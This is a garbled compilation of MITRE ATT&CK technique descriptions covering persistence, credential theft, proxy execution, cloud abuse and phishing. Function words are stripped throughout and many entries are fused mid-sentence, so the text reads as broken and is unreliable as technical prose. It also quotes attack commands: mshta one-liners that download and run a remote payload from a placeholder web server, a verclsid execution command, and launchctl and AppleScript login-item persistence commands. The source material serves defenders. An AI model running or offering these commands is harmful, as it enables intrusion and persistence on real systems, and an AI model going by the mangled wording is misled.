For example, adversaries add malicious application path `~/Library/Preferences/com.apple.dock.plist` file, controls apps Dock. Adversaries modify <code>LSUIElement</code> key application’s <code>info.plist</code> file  app background. Adversaries insert key-value pairs insert environment variables, <code>LSEnvironment</code>, enable persistence [Dynamic Linker Hijacking](https://attack.mitre.org/techniques/T1574/006).(Citation: wardle chp2 persistence)(Citation: eset_osx_flashback) Adversaries establish persistence elevate privileges executing malicious content triggered AppCert DLLs loaded processes. Dynamic-link libraries (DLLs) <code>AppCertDLLs</code> Registry key <code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\</code> loaded process calls ubiquitously application programming interface (API) functions <code>CreateProcess</code>, <code>CreateProcessAsUser</code>, <code>CreateProcessWithLoginW</code>, <code>CreateProcessWithTokenW</code>, <code>WinExec</code>. (Citation: Elastic Process Injection July 2017)

Similar [Process Injection](https://attack.mitre.org/techniques/T1055), abused elevated privileges causing malicious DLL loaded context separate processes computer. Malicious AppCert DLLs provide persistence continuously triggered API activity.  Connection Manager Profile Installer (CMSTP.exe) command-line program install Connection Manager service profiles. (Citation: Connection Manager Oct 2009) CMSTP.exe accepts installation file (INF) parameter installs service profile leveraged remote access connections.

Adversaries supply CMSTP.exe INF files infected malicious commands. (Citation: Twitter CMSTP Usage Jan 2018) [Regsvr32](https://attack.mitre.org/techniques/T1117) / ”Squiblydoo”, CMSTP.exe abused load execute DLLs (Citation: MSitPros CMSTP Aug 2017)  scriptlets (SCT) remote servers. (Citation: Twitter CMSTP Jan 2018) (Citation: GitHub Ultimate AppLocker Bypass List) (Citation: Endurant CMSTP July 2018) execution bypass AppLocker whitelisting defenses CMSTP.exe legitimate, signed application.

CMSTP.exe abused [Bypass User Account Control](https://attack.mitre.org/techniques/T1088) execute arbitrary commands malicious INF auto-elevated interface. (Citation: MSitPros CMSTP Aug 2017) (Citation: GitHub Ultimate AppLocker Bypass List) (Citation: Endurant CMSTP July 2018) disguise source malicious traffic, adversaries chain multiple proxies. Typically, defender identify proxy traffic traversed enters network; defender identify previous proxies last-hop proxy. technique identifying original source malicious traffic difficult requiring defender trace malicious traffic proxies identify source. Adversaries setup email forwarding rules collect sensitive information. Adversaries abuse email-forwarding rules monitor activities victim, steal information, gain intelligence victim victim’s organization exploits operations.(Citation: US-CERT TA18-068A 2018) Furthermore, email forwarding rules adversaries maintain persistent access victim's emails compromised credentials reset administrators.(Citation: Pfammatter - Hidden Inbox Rules) email clients users create inbox rules email functions, including forwarding recipient. rules created local email application, interface, command-line interface. Messages forwarded internal external recipients, restrictions limiting extent rule. Administrators create forwarding rules user accounts considerations outcomes.(Citation: Tim McMichael Exchange Mail Forwarding 2)(Citation: Mac Forwarding Rules)

Any user administrator organization (or adversary valid credentials) create rules automatically received messages recipient, emails locations based sender, more. Adversaries hide rule Messaging API (MAPI) modify rule properties, hidden visible Outlook, OWA Exchange Administration tools.(Citation: Pfammatter - Hidden Inbox Rules) Adversaries stage collected data central location directory prior Exfiltration. Data separate files combined file techniques [Archive Collected Data](https://attack.mitre.org/techniques/T1560). Interactive command shells used, common functionality [cmd](https://attack.mitre.org/software/S0106) bash data staging location.(Citation: PWC Cloud Hopper April 2017)

In cloud environments, adversaries stage data instance virtual machine exfiltration. adversary [Create Cloud Instance](https://attack.mitre.org/techniques/T1578/002) stage data instance.(Citation: Mandiant M-Trends 2020)

Adversaries choose stage data victim network centralized location prior Exfiltration minimize connections C2 server evade detection. Adversaries steal forge certificates authentication access remote systems resources. Digital certificates sign encrypt messages files. Certificates authentication material. example, Azure device certificates Active Directory Certificate Services (AD CS) certificates bind identity credentials domain accounts.(Citation: O365 Blog Azure Device IDs)(Citation: Overview)

Authentication certificates stolen forged. example, certificates stolen encrypted storage (in Registry files), misplaced certificate files [Unsecured Credentials](https://attack.mitre.org/techniques/T1552)), Windows certificate store crypto APIs.(Citation: SpecterOps Certified Pre Owned)(Citation: GitHub CertStealer)(Citation: GitHub GhostPack Certificates) enrollment rights, users machines domain request manually renew certificates enterprise certificate authorities (CA). enrollment process defines settings permissions certificate. note, certificate’s extended key usage (EKU) values define signing, encryption, authentication cases, certificate’s subject alternative (SAN) values define certificate owner’s alternate names.(Citation: Medium Certified Pre Owned)

Abusing certificates authentication credentials enable behaviors [Lateral Movement](https://attack.mitre.org/tactics/TA0008). Certificate-related misconfigurations enable opportunities [Privilege Escalation](https://attack.mitre.org/tactics/TA0004), allowing users impersonate assume privileged accounts permissions identities (SANs) certificate. abuses enable [Persistence](https://attack.mitre.org/tactics/TA0003) stealing forging certificates [Valid Accounts](https://attack.mitre.org/techniques/T1078) duration certificate's validity, user password resets. Authentication certificates stolen forged machine accounts.

Adversaries access root (or subordinate) certificate private (or mechanisms protecting/managing keys) establish [Persistence](https://attack.mitre.org/tactics/TA0003) forging arbitrary authentication certificates victim domain (known “golden” certificates).(Citation: Medium Certified Pre Owned) Adversaries target certificates services access forms credentials, [Golden Ticket](https://attack.mitre.org/techniques/T1558/001) ticket-granting tickets (TGT) NTLM plaintext.(Citation: Medium Certified Pre Owned) Adversaries register device adversary-controlled account. Devices registered multifactor authentication (MFA) system, handles authentication network, device management system, handles device access compliance.

MFA systems, Duo Okta, users associate devices accounts complete MFA requirements. adversary compromises user’s credentials enroll device bypass initial MFA requirements gain persistent access network.(Citation: CISA MFA PrintNightmare)(Citation: DarkReading FireEye SolarWinds)

Similarly, adversary existing access network register device Azure device management system, Intune, access sensitive data resources bypassing conditional access policies.(Citation: AADInternals - Device Registration)(Citation: AADInternals - Conditional Access Bypass)(Citation: DEV-0537) 

Devices registered Azure conduct [Internal Spearphishing](https://attack.mitre.org/techniques/T1534) campaigns intra-organizational emails, treated suspicious email client.(Citation: - Device Registration) Additionally, adversary perform [Service Exhaustion Flood](https://attack.mitre.org/techniques/T1499/002) Azure tenant registering devices.(Citation: AADInternals - BPRT) Adversaries attempt listing network connections compromised accessing remote systems querying network. 

An adversary gains access cloud-based environment map Virtual Private Clouds Virtual Networks determine systems services connected. actions performed types discovery techniques depending operating system, include details networked cloud environment relevant adversary's goals. Cloud providers virtual networks operate.(Citation: Amazon AWS VPC Guide)(Citation: Azure Virtual Network Overview)(Citation: Google VPC Overview) Similarly, adversaries gain access network devices perform discovery activities gather connected systems services.

Utilities commands acquire include [netstat](https://attack.mitre.org/software/S0104), "net use," "net session" [Net](https://attack.mitre.org/software/S0039). Mac Linux, [netstat](https://attack.mitre.org/software/S0104) <code>lsof</code> list current connections. <code>who -a</code> <code>w</code> users logged in, "net session". Additionally, built-in features native network devices [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) (e.g. <code>show ip sockets</code>, <code>show tcp brief</code>).(Citation: US-CERT-TA18-106A) Adversaries compromise third-party infrastructure targeting. Infrastructure solutions include physical cloud servers, domains, third-party DNS services. buying, leasing, renting infrastructure adversary compromise infrastructure phases adversary lifecycle.(Citation: Mandiant APT1)(Citation: ICANNDomainNameHijacking)(Citation: Talos DNSpionage Nov 2018)(Citation: FireEye EPS Awakens 2) Additionally, adversaries compromise numerous machines form botnet leverage.

Use compromised infrastructure adversary stage, launch, execute operation. Compromised infrastructure adversary operations blend traffic normal, contact reputation trusted sites. example, adversaries leverage compromised infrastructure (potentially conjunction [Digital Certificates](https://attack.mitre.org/techniques/T1588/004)) blend support staged gathering [Phishing](https://attack.mitre.org/techniques/T1566) campaigns.(Citation: FireEye DNS Hijack 2019) 

By compromised infrastructure, adversaries difficult tie actions them. Prior targeting, adversaries compromise infrastructure adversaries.(Citation: NSA NCSC Turla OilRig) Adversaries abuse specific file formats subvert Mark-of-the-Web (MOTW) controls. Windows, files downloaded Internet, tagged hidden NTFS Alternate Data Stream (ADS) named <code>Zone.Identifier</code> specific MOTW.(Citation: Zone.Identifier 2020) Files tagged MOTW protected perform actions. example, starting Office 10, Office file MOTW, Protected View. Executables tagged MOTW processed Windows Defender SmartScreen compares files allowlist well-known executables. file known/trusted, SmartScreen prevent execution warn user it.(Citation: Beek VHD Dec 2020)(Citation: Outflank MotW 2020)(Citation: Intezer Russian APT Dec 2020)

Adversaries abuse container files compressed/archive (.arj, .gzip) disk image (.iso, .vhd) file formats deliver malicious payloads tagged MOTW. Container files downloaded Internet marked MOTW files inherit MOTW container files extracted mounted. MOTW NTFS feature container files support NTFS alternative data streams. container file extracted mounted, files contained treated local files disk protections.(Citation: Beek VHD Dec 2020)(Citation: Outflank MotW 2020) Adversaries disable network device’s dedicated hardware encryption, enable leverage weaknesses software encryption reduce effort involved collecting, manipulating, exfiltrating transmitted data.

Many network devices routers, switches, firewalls, perform encryption network traffic secure transmission networks. Often, devices equipped special, dedicated encryption hardware greatly increase speed encryption process prevent malicious tampering. adversary takes control device, disable dedicated hardware, example, [Modify Image](https://attack.mitre.org/techniques/T1601), forcing software perform encryption processors. typically conjunction attacks weaken strength cipher software [Reduce Key Space](https://attack.mitre.org/techniques/T1600/001)). (Citation: Cisco Blog Legacy Device Attacks) Adversaries abuse Pre-OS Boot mechanisms establish persistence system. booting process computer, firmware startup services loaded operating system. programs control flow execution operating takes control.(Citation: Wikipedia Booting)

Adversaries overwrite data boot drivers firmware BIOS (Basic Input/Output System) Unified Extensible Firmware Interface (UEFI) persist systems layer operating system. difficult detect malware level detected host software-based defenses. **This technique deprecated. [Command Scripting Interpreter](https://attack.mitre.org/techniques/T1059) appropriate.**

Adversaries scripts aid operations perform multiple actions manual. Scripting speeding operational tasks reducing time required gain access critical resources. scripting languages bypass process monitoring mechanisms interacting operating API level calling programs. Common scripting languages Windows include VBScript [PowerShell](https://attack.mitre.org/techniques/T1086) form command-line batch scripts.

Scripts embedded Office documents macros set execute files [Spearphishing Attachment](https://attack.mitre.org/techniques/T1193) types spearphishing opened. Malicious embedded macros alternative execution software exploitation [Exploitation Client Execution](https://attack.mitre.org/techniques/T1203), adversaries rely macros allowed user accept activate them.

Many popular offensive frameworks exist forms scripting security testers adversaries alike. Metasploit (Citation: Metasploit_Ref), Veil (Citation: Veil_Ref), PowerSploit (Citation: Powersploit) examples popular penetration testers exploit post-compromise operations include features evading defenses. adversaries PowerShell. (Citation: Alperovitch 2014) Adversaries build container image host bypass defenses monitor retrieval malicious images public registry. remote <code>build</code> request Docker API includes Dockerfile pulls vanilla base image, alpine, public local registry builds custom image it.(Citation: Docker Build Image)

An adversary advantage <code>build</code> API build custom image host includes malware downloaded C2 server, utilize [Deploy Container](https://attack.mitre.org/techniques/T1610) custom image.(Citation: Aqua Build Images Hosts)(Citation: Aqua Security Cloud Native Threat Report June 2021) base image pulled public registry, defenses detect image malicious it’s vanilla image. base image resides local registry, pull considered suspicious image environment.  **This technique deprecated used.**

Adversaries add malicious content internally accessible network file share website's webroot content directory (Citation: Root OCT 2016) (Citation: Apache Server 2018) browse content browser server execute malicious content. malicious content typically context permissions server process, local administrative privileges, depending server configured.

This mechanism shared access remote execution lateral movement running server. example, server running PHP network share adversary upload remote access tool PHP script execute RAT running server specific visited. (Citation: Webroot PHP 2011) Adversaries inject portable executables (PE) processes evade process-based defenses elevate privileges. injection method executing arbitrary code address space separate live process. 

PE injection commonly performed copying code (perhaps file disk) virtual address space target process invoking thread. write performed native Windows API calls <code>VirtualAllocEx</code> <code>WriteProcessMemory</code>, invoked <code>CreateRemoteThread</code> additional code (ex: shellcode). displacement injected code introduce additional requirement functionality remap memory references. (Citation: Elastic Process Injection July 2017) 

Running code context process access process's memory, system/network resources, elevated privileges. Execution injection evade detection security products execution masked legitimate process.  Adversaries abuse verclsid.exe proxy execution malicious code. Verclsid.exe Extension CLSID Verification Host responsible verifying extension Windows Explorer Windows Shell.(Citation: WinOSBite verclsid.exe)

Adversaries abuse verclsid.exe execute malicious payloads. achieved running <code>verclsid.exe /S /C {CLSID}</code>, file referenced Class (CLSID), unique identification identify objects. payloads executed verclsid.exe perform malicious actions, loading executing scriptlets (SCT) remote servers (similar [Regsvr32](https://attack.mitre.org/techniques/T1218/010)). binary signed native Windows systems, proxying execution verclsid.exe bypass application control solutions account potential abuse.(Citation: LOLBAS Verclsid)(Citation: Red Canary Verclsid.exe)(Citation: BOHOPS Abusing Registry)(Citation: Nick Tyrer GitHub)  Adversaries compromise accounts services targeting. operations incorporating social engineering, utilization online persona important. creating cultivating accounts [Establish Accounts](https://attack.mitre.org/techniques/T1585)), adversaries compromise existing accounts. Utilizing existing persona engender level trust potential victim relationship, knowledge of, compromised persona. 

A variety methods exist compromising accounts, gathering credentials [Phishing Information](https://attack.mitre.org/techniques/T1598), purchasing credentials third-party sites, brute forcing credentials (ex: password reuse breach credential dumps).(Citation: AnonHBGary) Prior compromising accounts, adversaries conduct Reconnaissance inform decisions accounts compromise operation.

Personas exist single multiple sites (ex: Facebook, LinkedIn, Twitter, Google, etc.). Compromised accounts require additional development, include filling modifying profile information, developing social networks, incorporating photos.

Adversaries leverage compromised email accounts [Phishing Information](https://attack.mitre.org/techniques/T1598) [Phishing](https://attack.mitre.org/techniques/T1566). Adversaries abuse launchctl execute commands programs. Launchctl interfaces launchd, service management framework macOS. Launchctl supports subcommands command-line, interactively, redirected standard input.(Citation: Launchctl Man)

Adversaries launchctl execute commands programs [Launch Agent](https://attack.mitre.org/techniques/T1543/001)s [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)s. Common subcommands include: <code>launchctl load</code>,<code>launchctl unload</code>, <code>launchctl start</code>. Adversaries scripts manually commands <code>launchctl load -w "%s/Library/LaunchAgents/%s"</code> <code>/bin/launchctl load</code> execute [Launch Agent](https://attack.mitre.org/techniques/T1543/001)s [Launch Daemon](https://attack.mitre.org/techniques/T1543/004)s.(Citation: Sofacy Komplex Trojan)(Citation: 20 macOS Common Tools Techniques)
 Adversaries compromise numerous third-party systems form botnet that targeting. botnet network compromised systems instructed perform coordinated tasks.(Citation: Norton Botnet) purchasing/renting botnet booter/stresser service, adversaries build botnet compromising numerous third-party systems.(Citation: Imperva DDoS Hire) Adversaries conduct takeover existing botnet, redirecting bots adversary-controlled C2 servers.(Citation: Dell Dridex Oct 2015) botnet disposal, adversaries perform follow-on activity large-scale [Phishing](https://attack.mitre.org/techniques/T1566) Distributed Denial Service (DDoS). Adversaries abuse scripting built-in command interpreters (CLI) network devices execute malicious command payloads. CLI primary users administrators interact device view information, modify device operations, perform diagnostic administrative functions. CLIs typically permission levels required commands. 

Scripting interpreters automate tasks extend functionality command set included network OS. CLI scripting interpreter accessible direct console connection, remote means, telnet [SSH](https://attack.mitre.org/techniques/T1021/004).

Adversaries network CLI change network devices behave operate. CLI manipulate traffic flows intercept manipulate data, modify startup configuration parameters load malicious software, disable security features logging avoid detection.(Citation: Cisco Synful Knock Evolution) Adversaries search bash command history compromised systems insecurely stored credentials. Bash track commands users type command-line "history" utility. user logs out, history flushed user’s <code>.bash_history</code> file. user, file resides location: <code>~/.bash_history</code>. Typically, file track user’s 500 commands. Users type usernames passwords command-line parameters programs, saved file log out. Adversaries abuse file potential credentials. (Citation: External DA, OS Way) Adversaries downgrade version features outdated, vulnerable, support updated security controls logging. example, [PowerShell](https://attack.mitre.org/techniques/T1059/001) versions 5+ includes Script Block Logging (SBL) record executed script content. However, adversaries attempt execute previous version PowerShell support SBL intent [Impair Defenses](https://attack.mitre.org/techniques/T1562) running malicious scripts detected.(Citation: CrowdStrike BGH Ransomware 2021)(Citation: Mandiant BYOL 2018)(Citation: att_def_ps_logging)

Adversaries downgrade less-secure versions features system, [Command Scripting Interpreter](https://attack.mitre.org/techniques/T1059)s network protocols abused enable [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557).(Citation: Praetorian TLS Downgrade Attack 2014) Adversaries provide malicious content XPC service daemon local code execution. macOS XPC services basic inter-process communication processes, XPC Service daemon third-party application privileged helper tools. Applications send messages XPC Service daemon, runs root, low-level XPC Service <code>C API</code> level <code>NSXPCConnection API</code> handle tasks require elevated privileges (such network connections). Applications responsible providing protocol definition serves blueprint XPC services. Developers typically XPC Services provide applications stability privilege separation application client daemon.(Citation: creatingXPCservices)(Citation: Designing Daemons Apple Dev)

Adversaries abuse XPC services execute malicious content. Requests malicious execution passed application's XPC Services handler.(Citation: CVMServer Vuln)(Citation: Learn XPC Exploitation) include identifying abusing improper XPC client validation poor sanitization input parameters conduct [Exploitation Privilege Escalation](https://attack.mitre.org/techniques/T1068). Adversaries employ detect avoid virtualization analysis environments. include changing behaviors based checks presence artifacts indicative virtual machine environment (VME) sandbox. adversary detects VME, alter malware disengage victim conceal core functions implant. search VME artifacts dropping secondary additional payloads. Adversaries learned [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) automated discovery shape follow-on behaviors.(Citation: Deloitte Environment Awareness)

Adversaries methods accomplish [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) checking security monitoring tools Sysinternals, Wireshark, etc.) artifacts analysis virtualization. Adversaries check legitimate user activity determine analysis environment. Additional methods include sleep timers loops malware code avoid operating temporary sandbox.(Citation: Unit 42 Pirpi July 2015)

 Adversaries existing, legitimate external service relaying data to/from compromised system. Popular websites social media acting mechanism C2 cover likelihood hosts network communicating prior compromise. common services, offered Google Twitter, easier adversaries hide expected noise. service providers commonly SSL/TLS encryption, adversaries level protection.

Use services protect back-end C2 infrastructure discovery malware binary analysis enabling operational resiliency (since infrastructure dynamically changed). Adversaries search local file systems remote file shares files insecurely stored credentials. files created users store credentials, shared credential stores individuals, configuration files passwords service, source code/binary files embedded passwords.

It extract passwords backups saved virtual machines [OS Credential Dumping](https://attack.mitre.org/techniques/T1003). (Citation: 2014) Passwords Policy Preferences stored Windows Domain Controller. (Citation: SRD GPP)

In cloud containerized environments, authenticated user service account credentials stored local configuration credential files.(Citation: Unit 42 Hildegard Malware) parameters deployment commands container logs.(Citation: Unit 42 Unsecured Docker Daemons) cases, files copied reused machine contents read authenticate files.(Citation: Specter Ops - Cloud Credential Storage) Adversaries perform calculations addresses returned DNS determine port IP address command control, relying predetermined port actual returned IP address. IP port calculation bypass egress filtering C2 channel.(Citation: Meyers Numbered Panda)

One implementation [DNS Calculation](https://attack.mitre.org/techniques/T1568/003) octets IP address DNS response values calculate port command control traffic.(Citation: Meyers Numbered Panda)(Citation: Moran 2014)(Citation: Rapid7G20Espionage) Adversaries abuse mshta.exe proxy execution malicious .hta files Javascript VBScript trusted Windows utility. examples types threats leveraging mshta.exe initial compromise execution code (Citation: Cylance Dust Storm) (Citation: Red Canary HTA Abuse Deux) (Citation: FireEye Attacks Leveraging HTA) (Citation: Airbus Security Kovter Analysis) (Citation: FireEye FIN7 April 2017) 

Mshta.exe utility executes Applications (HTA) files. (Citation: Wikipedia Application) HTAs standalone applications execute models technologies Internet Explorer, browser. (Citation: MSDN Applications)

Files executed mshta.exe inline script: <code>mshta vbscript:Close(Execute("GetObject(""script:https[:]//webserver/payload[.]sct"")"))</code>

They executed URLs: <code>mshta http[:]//webserver/payload[.]hta</code>

Mshta.exe bypass application control solutions account potential use. mshta.exe executes Internet Explorer's security context, bypasses browser security settings. (Citation: LOLBAS Mshta) Adversaries add login items execute user login gain persistence escalate privileges. Login items applications, documents, folders, server connections automatically launched user logs in.(Citation: Login Items Apple) Login items shared file list Service Management Framework.(Citation: Adding Login Items) Shared file list login items set scripting languages [AppleScript](https://attack.mitre.org/techniques/T1059/002), Service Management Framework API <code>SMLoginItemSetEnabled</code>.

Login items installed Service Management Framework leverage <code>launchd</code>, visible Preferences, removed application created them.(Citation: Adding Login Items)(Citation: SMLoginItemSetEnabled Schroeder 2013) Login items created shared file list visible Preferences, hide application launches, executed LaunchServices, launchd, applications, documents, URLs Finder.(Citation: Launch Services Apple Developer) Users applications login items configure user environment launch commonly services applications, email, chat, music applications.

Adversaries utilize [AppleScript](https://attack.mitre.org/techniques/T1059/002) [Native API](https://attack.mitre.org/techniques/T1106) calls create login item spawn malicious executables.(Citation: ELC Running startup) Prior version 10.5 macOS, adversaries add login items [AppleScript](https://attack.mitre.org/techniques/T1059/002) send Apple events “System Events” process, AppleScript dictionary manipulating login items.(Citation: Login Items AE) Adversaries command <code>tell application “System Events” login item properties /path/to/executable</code>.(Citation: Startup Items Eclectic)(Citation: hexed osx.dok analysis 2019)(Citation: Add List Remove Login Items Apple Script) command adds path malicious executable login item file list located <code>~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm</code>.(Citation: Startup Items Eclectic) Adversaries login items launch executables control victim remotely gain privilege escalation prompting user credentials.(Citation: objsee mac malware 2017)(Citation: CheckPoint Dok)(Citation: objsee netwire backdoor 2019) Adversaries upload, install, set capabilities targeting. support operations, adversary capabilities developed ([Develop Capabilities](https://attack.mitre.org/techniques/T1587)) ([Obtain Capabilities](https://attack.mitre.org/techniques/T1588)) stage infrastructure control. capabilities staged infrastructure purchased/rented adversary ([Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)) compromised ([Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)). Capabilities staged services, GitHub Pastebin, Platform-as-a-Service (PaaS) offerings enable users easily provision applications.(Citation: Volexity Ocean Lotus November 2020)(Citation: Dragos Heroku Watering Hole)(Citation: Malwarebytes Heroku Skimmers)(Citation: Netskope GCP Redirection)(Citation: Netskope Cloud Phishing)

Staging capabilities aid adversary initial access post-compromise behaviors, including (but limited to):

* Staging resources conduct [Drive-by Compromise](https://attack.mitre.org/techniques/T1189) user browses site.(Citation: FireEye CFR Watering Hole 2012)(Citation: Gallagher 2015)(Citation: ATT ScanBox)
* Staging resources link target spearphishing.(Citation: Malwarebytes Silent Librarian October 2020)(Citation: Proofpoint TA407 September 2019)
* Uploading malware tools location accessible victim network enable [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105).(Citation: Volexity Ocean Lotus November 2020)
* Installing acquired SSL/TLS certificate encrypt command control traffic (ex: [Asymmetric Cryptography](https://attack.mitre.org/techniques/T1573/002) [Web Protocols](https://attack.mitre.org/techniques/T1071/001)).(Citation: DigiCert Install SSL Cert) Adversaries resources referenced link targeting. adversary rely user clicking malicious link divulge (including credentials) gain execution, [Malicious Link](https://attack.mitre.org/techniques/T1204/001). Links spearphishing, sending email accompanied social engineering coax user actively paste URL browser. Prior phish (as [Spearphishing Link](https://attack.mitre.org/techniques/T1598/003)) phish gain initial access (as [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002)), adversary set resources link target spearphishing link. 

Typically, resources link target include client-side script [JavaScript](https://attack.mitre.org/techniques/T1059/007) decide content serve user. Adversaries clone legitimate sites serve link target, include cloning login legitimate services organization login effort harvest credentials [Spearphishing Link](https://attack.mitre.org/techniques/T1598/003).(Citation: Malwarebytes Silent Librarian October 2020)(Citation: Proofpoint TA407 September 2019) Adversaries [Upload Malware](https://attack.mitre.org/techniques/T1608/001) link target malware download/execution user.

Adversaries purchase domains legitimate domains (ex: homoglyphs, typosquatting, top-level domain, etc.) acquisition infrastructure ([Domains](https://attack.mitre.org/techniques/T1583/001)) facilitate [Malicious Link](https://attack.mitre.org/techniques/T1204/001). Link shortening services employed. Adversaries paid accounts Platform-as-a-Service providers host link targets advantage trusted domains providers avoid blocked.(Citation: Netskope GCP Redirection)(Citation: Netskope Cloud Phishing)(Citation: Intezer App Service Phishing) Adversaries create multiple stages command control employed conditions functions. multiple stages obfuscate command control channel detection difficult.

Remote access tools first-stage command control server instructions. stage automated capabilities collect basic host information, update tools, upload additional files. remote access tool (RAT) uploaded redirect host second-stage command control server. stage featured adversary interact reverse additional RAT features.

The stages hosted separately overlapping infrastructure. loader backup first-stage callbacks [Fallback Channels](https://attack.mitre.org/techniques/T1008) original first-stage communication path discovered blocked. Adversaries execution guardrails constrain execution actions based adversary supplied environment specific conditions expected target. Guardrails ensure payload executes intended target reduces collateral damage adversary’s campaign.(Citation: FireEye Kevin Mandia Guardrails) Values adversary provide target environment guardrails include specific network share names, attached physical devices, files, joined Active Directory (AD) domains, local/external IP addresses.(Citation: FireEye Outlook Dec 2019)

Guardrails prevent exposure capabilities environments intended compromised operated within. guardrails distinct typical [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497). [Virtualization/Sandbox Evasion](https://attack.mitre.org/techniques/T1497) involve checking sandbox values continuing execution match, guardrails involve checking expected target-specific continuing execution match. Adversaries enumerate objects cloud storage infrastructure. Adversaries automated discovery shape follow-on behaviors, including requesting specific objects cloud storage.  [File Directory Discovery](https://attack.mitre.org/techniques/T1083) local host, identifying storage services [Cloud Infrastructure Discovery](https://attack.mitre.org/techniques/T1580)) adversaries access contents/objects stored cloud infrastructure.

Cloud service providers offer APIs allowing users enumerate objects stored cloud storage. Examples include ListObjectsV2 AWS (Citation: ListObjectsV2) List Blobs Azure(Citation: List Blobs) . Adversaries forge cookies gain access applications Internet services. applications services (hosted cloud SaaS environments on-premise servers) session cookies authenticate authorize user access.

Adversaries generate cookies gain access resources. differs [Steal Session Cookie](https://attack.mitre.org/techniques/T1539) behaviors cookies forged adversary, stolen intercepted legitimate users. common applications standardized documented cookie values generated tools interfaces.(Citation: Pass Cookie) generation cookies requires secret values, passwords, [Private Keys](https://attack.mitre.org/techniques/T1552/004), cryptographic seed values.

Once forged, adversaries cookies access resources ([Web Session Cookie](https://attack.mitre.org/techniques/T1550/004)), bypass multi-factor authentication protection mechanisms.(Citation: Volexity SolarWinds)(Citation: Pass Cookie)(Citation: Unit 42 Mac Crypto Cookies January 2019) Adversaries duplicate impersonate user's token escalate privileges bypass access controls. adversary create access token duplicates existing token <code>DuplicateToken(Ex)</code>. token <code>ImpersonateLoggedOnUser</code> calling thread impersonate logged user's security context, <code>SetThreadToken</code> assign impersonated token thread.

An adversary specific, existing process assign token to. example, target user non-network logon session system. Adversaries exfiltrate data code repository primary command control channel. Code repositories accessible API (ex: https://api.github.com). Access APIs HTTPS, adversary additional level protection.

Exfiltration code repository provide cover adversary popular service hosts network.  Adversaries port knocking hide ports persistence command control. enable port, adversary sends series attempted connections predefined sequence closed ports. sequence completed, port accomplished host based firewall, implemented custom software.

This technique observed dynamic listening port initiating connection listening server system.

The observation signal packets trigger communication conducted methods. means, originally implemented Cd00r (Citation: Hartrell cd00r 2002), libpcap libraries sniff packets question. method leverages raw sockets, enables malware ports programs. Adversaries register services that targeting. variety popular websites exist adversaries register web-based service abused stages adversary lifecycle, Command Control ([Web Service](https://attack.mitre.org/techniques/T1102)) [Exfiltration Service](https://attack.mitre.org/techniques/T1567). common services, offered Google Twitter, easier adversaries hide expected noise. utilizing service, adversaries difficult physically tie operations them. Adversaries steal application access tokens acquiring credentials access remote systems resources.

Application access tokens authorized API requests behalf user service commonly access resources cloud container-based applications software-as-a-service (SaaS).(Citation: Auth0 - Access Tokens Secure APIs Sept 2019) OAuth commonly implemented framework issues tokens users access systems. Adversaries steal account API tokens cloud containerized environments access data perform actions permissions accounts, lead privilege escalation compromise environment.

In Kubernetes environments, processes running container communicate Kubernetes API server service account tokens. container compromised, attacker steal container’s token gain access Kubernetes API commands.(Citation: Kubernetes Service Accounts)

Token theft occur social engineering, user action required grant access. application desiring access cloud-based services protected APIs gain entry OAuth 2.0 variety authorization protocols. commonly-used sequence Microsoft's Authorization Code Grant flow.(Citation: Identity Platform Protocols 2019)(Citation: - OAuth Code Authorization flow - June 2019) OAuth access token enables third-party application interact resources user data requested application obtaining user credentials. 
 
Adversaries leverage OAuth authorization constructing malicious application designed granted access resources target user's OAuth token.(Citation: Amnesty OAuth Phishing Attacks, August 2019)(Citation: Trend Micro Pawn Storm OAuth 2017) adversary complete registration application authorization server, Identity Platform Azure Portal, Visual Studio IDE, command-line interface, PowerShell, REST API calls.(Citation: - Azure App Registration - 2019) Then, send [Spearphishing Link](https://attack.mitre.org/techniques/T1566/002) target user entice grant access application. OAuth access token granted, application gain long-term access features user account [Application Access Token](https://attack.mitre.org/techniques/T1550/001).(Citation: - Azure Identity Tokens - Aug 2019)

Application access tokens function limited lifetime, limiting adversary utilize stolen token. However, cases, adversaries steal application refresh tokens(Citation: Auth0 Understanding Refresh Tokens), allowing access tokens prompting user.  

 Adversaries send spearphishing messages malicious attachment elicit sensitive targeting. Spearphishing attempt trick targets divulging information, frequently credentials actionable information. Spearphishing frequently involves social engineering techniques, posing source reason collect (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) [Compromise Accounts](https://attack.mitre.org/techniques/T1586)) sending multiple, seemingly urgent messages.

All forms spearphishing electronically delivered social engineering targeted specific individual, company, industry. scenario, adversaries attach file spearphishing email rely recipient populating returning file.(Citation: Sophos Attachment)(Citation: GitHub Phishery) spearphishing email plausible reason file filled-in, request business associate. Adversaries previous reconnaissance efforts (ex: [Search Websites/Domains](https://attack.mitre.org/techniques/T1593) [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)) craft persuasive believable lures. Adversaries add adversary-controlled credentials cloud account maintain persistent access victim accounts instances environment.

For example, adversaries add credentials Service Principals Applications addition existing legitimate credentials Azure AD.(Citation: SolarWinds Customer Guidance)(Citation: Blue Cloud Death)(Citation: Blue Cloud Death Video) credentials include x509 passwords.(Citation: SolarWinds Customer Guidance) sufficient permissions, variety add credentials including Azure Portal, Azure command interface, Azure PowerShell modules.(Citation: Demystifying Azure Service Principals)

In infrastructure-as-a-service (IaaS) environments, gaining access [Cloud Accounts](https://attack.mitre.org/techniques/T1078/004), adversaries generate import SSH <code>CreateKeyPair</code> <code>ImportKeyPair</code> API AWS <code>gcloud compute os-login ssh-keys add</code> command GCP.(Citation: GCP SSH Key Add) persistent access instances cloud environment usage compromised cloud accounts.(Citation: Expel Evil AWS)(Citation: Expel Scenes)

